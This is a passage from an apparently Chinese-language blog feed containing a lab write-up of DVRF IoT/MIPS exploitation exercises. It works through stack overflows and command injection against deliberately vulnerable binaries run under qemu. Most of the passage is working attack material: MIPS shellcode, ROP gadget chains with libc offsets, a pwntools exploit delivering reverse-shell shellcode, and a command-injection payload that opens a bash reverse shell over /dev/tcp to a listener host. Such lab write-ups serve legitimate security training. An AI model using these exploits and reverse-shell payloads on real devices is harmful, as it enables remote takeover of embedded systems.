class="string">&quot;\xfc\xff\xa0\xaf&quot;</span>  <span class="comment"># sw $zero, -4($sp)</span></span><br><span class="line">shellcode += <span class="string">&quot;\xf5\xff\xa4\x27&quot;</span>  <span class="comment"># addiu $a0, $sp, -0xc</span></span><br><span class="line">shellcode += <span class="string">&quot;\xff\xff\x05\x28&quot;</span>  <span class="comment"># slti $a1, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">&quot;\xab\x0f\x02\x24&quot;</span>  <span class="comment"># addiu;$v0, $zero, 0xfab</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0c\x01\x01\x01&quot;</span>  <span class="comment"># syscall 0x40404</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(gadget5)<span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += p32(gadget4)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;stack_bof_02_payload&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">file.write(payload)</span><br></pre></td></tr></table></figure><h2 id="socket-bof"><a href="#socket-bof" class="headerlink" title="socket_bof"></a>socket_bof</h2><p>这题二进制文件用 ida 看伪代码有点瑕疵，本来溢出点变成了一个指针，导致一直找不到，最后无奈去看了下源码和结合汇编。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Pwnable Socket Program</span></span><br><span class="line"><span class="comment">// By b1ack0wl</span></span><br><span class="line"><span class="comment">// Stack Overflow</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt;<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: %s port_number - by b1ack0wl\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">500</span>] = <span class="string">&quot;\0&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> endstr[<span class="number">50</span>] = <span class="string">&quot;\0&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> listen_fd, comm_fd;</span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> option = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line"> </span><br><span class="line">    listen_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    bzero( &amp;servaddr, <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line"> </span><br><span class="line">    servaddr.sin_family = AF_INET;</span><br><span class="line">    servaddr.sin_addr.s_addr = htons(INADDR_ANY);</span><br><span class="line">    servaddr.sin_port = htons(atoi(argv[<span class="number">1</span>]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Binding to port %i\n&quot;</span>, atoi(argv[<span class="number">1</span>]));</span><br><span class="line"> </span><br><span class="line">    retval = bind(listen_fd, (struct sockaddr *) &amp;servaddr, <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line"><span class="keyword">if</span> (retval == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error Binding to port %i\n&quot;</span>, atoi(argv[<span class="number">1</span>]));</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(setsockopt(listen_fd, SOL_SOCKET,SO_REUSEADDR, (<span class="keyword">char</span>*)&amp;option, <span class="keyword">sizeof</span>(option)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Setsockopt failed :(\n&quot;</span>);</span><br><span class="line">close(listen_fd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    listen(listen_fd, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    comm_fd = accept(listen_fd, (struct sockaddr*) <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">        bzero(str, <span class="number">500</span>);</span><br><span class="line">write(comm_fd, <span class="string">&quot;Send Me Bytes:&quot;</span>,<span class="number">14</span>);</span><br><span class="line">        read(comm_fd,str,<span class="number">500</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(endstr, <span class="string">&quot;nom nom nom, you sent me %s&quot;</span>, str);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Sent back - %s&quot;</span>,str);</span><br><span class="line">        write(comm_fd, endstr, <span class="built_in">strlen</span>(endstr)+<span class="number">1</span>);</span><br><span class="line">shutdown(comm_fd, SHUT_RDWR);</span><br><span class="line">shutdown(listen_fd, SHUT_RDWR);</span><br><span class="line">close(comm_fd);</span><br><span class="line">close(listen_fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0x42</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出在这句 <code>sprintf(endstr, &quot;nom nom nom, you sent me %s&quot;, str);</code> str 是 socket 传入的数据，长度内容为我们所控制，溢出 padding 为 51 </p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210314175958.png" alt="image-20210314175958380"></p><h3 id="调试方法-1"><a href="#调试方法-1" class="headerlink" title="调试方法"></a>调试方法</h3><p>在 ubuntu 16.04 下 gdb-multiarch <code>target remote :1234</code> 链接上后报错退出，切换到 attify 能继续使用最常规方式调试：qemu-user 模式加 <code>-g</code> 打开调试端口，gdb-multiarch <code>target remote :1234</code> 链接上去。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># terminal 1</span></span><br><span class="line">sudo qemu-mipsel-static -L . -g 1234 -strace ./pwnable/ShellCode_Required/socket_bof 8884</span><br><span class="line"><span class="comment"># terminal 2 gdb-multiarch</span></span><br><span class="line"><span class="built_in">set</span> architecture mips </span><br><span class="line"><span class="built_in">set</span> endian little</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure><p>另外一个调试方法是 qemu system 启动 mips 系统，然后传入一个 gdb-server ，在里面运行程序然后 gdb-server attach 程序，再在外面用 gdb 链接上去。</p><p>attify 里面 gdb 插件是 gef ，用 vmmap 读不出 libc 地址</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315180459.png" alt="image-20210315180459380"></p><p>曲线救国在 <code>0x00400D34 </code> 打下断点，单步跟进去查看 sprintf 的真实地址，然后再从 <code>./lib/libc.so.0</code> 读取偏移算出基地址</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315180734.png" alt="image-20210315180734572"></p><p>全部题目用的 libc 都同一个，需要 shellcode 的题目，换下 shellcode 就能通用 exp 。前面 <code>stack_bof_02</code> 是在 ubuntu16 里面的脚本 libc_base 和 attify 不一样要换下基地址。</p><blockquote><p>Stack_bof_02 的 execve(‘/bin/sh’) 能打通</p></blockquote><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315222313.png" alt="image-20210315222312959"></p><p>找一个反弹 shell 的 shellcode 替换，或者将 shell 绑定到某个端口</p><blockquote><p>反弹 shell ：<a href="http://shell-storm.org/shellcode/files/shellcode-860.php">http://shell-storm.org/shellcode/files/shellcode-860.php</a></p><p>绑定 shell ：<a href="http://shell-storm.org/shellcode/files/shellcode-81.php">http://shell-storm.org/shellcode/files/shellcode-81.php</a></p></blockquote><p>绑定 shell 的 shellcode 预期是开在本地的 4919 端口，实际运行后发现并不是，要自己查端口 -。- ，然鹅 nc 连上去后程序会蹦掉。</p><p>反弹 shell 的 shellcode 预编是反弹到 <strong>192.168.1.177:31337</strong> ，要么修改网卡 ip ，要么就改一下 shellcode 传入的 ip </p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315201159.png" alt="image-20210315201159630"></p><p>将 ip 地址转换成 16 进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hex</span>(<span class="number">192</span>)<span class="comment">#0xc0</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">168</span>)<span class="comment">#0xa8</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">1</span>)<span class="comment">#0x01</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">177</span>)<span class="comment">#0xb1</span></span><br><span class="line"><span class="comment">#192.168.1.177==&gt;0xB101A8C0</span></span><br></pre></td></tr></table></figure><p>编译一下，编译失败看看是不是 binutils 没装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">asm(<span class="string">&quot;li $a1, 0xB101A8C0&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后搜索 <code>\x01\xb1\x05\x3c\xc0\xa8\xa5\x34</code> 替换为自己编译的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">stg3_SC = <span class="string">&quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20&quot;</span></span><br><span class="line"><span class="comment">#stg3_SC += &quot;\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;#192.168.1.177</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa5\xaf\xd3\x09\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;</span><span class="comment">#192.168.211.9</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xab\x0f\x02\x24\x0c\x09\x09\x01&quot;</span></span><br></pre></td></tr></table></figure><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line"></span><br><span class="line">libc_addr = <span class="number">0x4089b000</span><span class="comment">#0x766e5000</span></span><br><span class="line">sleep = <span class="number">0x0002F2B0</span></span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x2fb10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x76714b10:lia0,1</span></span><br><span class="line"><span class="string">   0x76714b14:movet9,s1</span></span><br><span class="line"><span class="string">   0x76714b18:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget2 = <span class="number">0x7730</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x766ec730:lwra,40(sp)</span></span><br><span class="line"><span class="string">   0x766ec734:lws3,36(sp)</span></span><br><span class="line"><span class="string">   0x766ec738:lws2,32(sp)</span></span><br><span class="line"><span class="string">   0x766ec73c:lws1,28(sp)</span></span><br><span class="line"><span class="string">   0x766ec740:lws0,24(sp)</span></span><br><span class="line"><span class="string">   0x766ec744:jrra</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget3 = <span class="number">0x20f1c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x76705f1c:movet9,s2</span></span><br><span class="line"><span class="string">   0x76705f20:lwra,36(sp)</span></span><br><span class="line"><span class="string">   0x76705f24:lws2,32(sp)</span></span><br><span class="line"><span class="string">   0x76705f28:lws1,28(sp)</span></span><br><span class="line"><span class="string">   0x76705f2c:lws0,24(sp)</span></span><br><span class="line"><span class="string">   0x76705f30:jrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget4 = <span class="number">0x16dd0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x766fbdd0:addiua0,sp,24</span></span><br><span class="line"><span class="string">   0x766fbdd4 &lt;optarg&gt;:movet9,s0</span></span><br><span class="line"><span class="string">   0x766fbdd8:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget5 = <span class="number">0x214a0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x767064a0:movet9,a0</span></span><br><span class="line"><span class="string">   0x767064a4:swv0,24(sp)</span></span><br><span class="line"><span class="string">   0x767064a8:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">stg3_SC = <span class="string">&quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20&quot;</span></span><br><span class="line"><span class="comment">#stg3_SC += &quot;\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;#192.168.1.177</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa5\xaf\xd3\x09\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;</span><span class="comment">#192.168.211.9</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xab\x0f\x02\x24\x0c\x09\x09\x01&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">51</span></span><br><span class="line">payload += p32(libc_addr+gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(libc_addr+gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(libc_addr+sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(libc_addr+gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(libc_addr+gadget5)<span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += p32(libc_addr+gadget4)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += stg3_SC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8882</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Send Me Bytes:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="socket-cmd"><a href="#socket-cmd" class="headerlink" title="socket_cmd"></a>socket_cmd</h2><p>远程命令注入，参考资料看下面：</p><blockquote><p><a href="https://www.yuque.com/bowu/blog/fhhefi">CTF之命令执行绕过总结</a></p><p><a href="https://whoamianony.top/2021/01/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%8F%8D%E5%BC%B9Shell%EF%BC%8C%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/">反弹Shell，看这一篇就够了</a></p></blockquote><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315232145.png" alt="image-20210315232145316"></p><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><p>依次打开终端运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#terminal 0</span></span><br><span class="line">qemu-mipsel-static -L . -strace ./pwnable/ShellCode_Required/socket_cmd 9999</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#terminal 1</span></span><br><span class="line">nc -lvvp 31337</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#tarminal 2</span></span><br><span class="line">nc 127.0.0.1 9999</span><br><span class="line">hacked|`bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.211.9/31337 0&gt;&amp;1&quot;</span>`</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315233919.png" alt="image-20210315233919821"></p><blockquote><p>是 iot 用户 nc 链接上去程序，程序是用 sudo 起来，所以切换到 root</p></blockquote><h2 id="Uaf-01-amp-heap-overflow"><a href="#Uaf-01-amp-heap-overflow" class="headerlink" title="Uaf_01&amp;heap_overflow"></a>Uaf_01&amp;heap_overflow</h2><p>剩下两题 heap_overflow 和 uaf_01 没有什么思路，都是输入一次然后程序就退出了。</p><p>uaf_01 重新申请相同 0x11 ，就跳转 <code>Awesome</code> 那个分支，但没啥用。</p><p>heap_overflow 有个后门，输入机会只有一次，然后程序就会关掉。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://ctf-wiki.org/pwn/linux/mips/mips_rop/">https://ctf-wiki.org/pwn/linux/mips/mips_rop/</a></p><p><a href="https://xz.aliyun.com/t/1511">https://xz.aliyun.com/t/1511</a></p><p><a href="https://www.cnblogs.com/hac425/p/9416864.html">https://www.cnblogs.com/hac425/p/9416864.html</a></p><p><a href="https://www.anquanke.com/post/id/184718">https://www.anquanke.com/post/id/184718</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 合天 </tag>
            
            <tag> DVRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOT环境配置V2</title>
      <link href="archives/a9578bea/"/>
      <url>archives/a9578bea/</url>
      
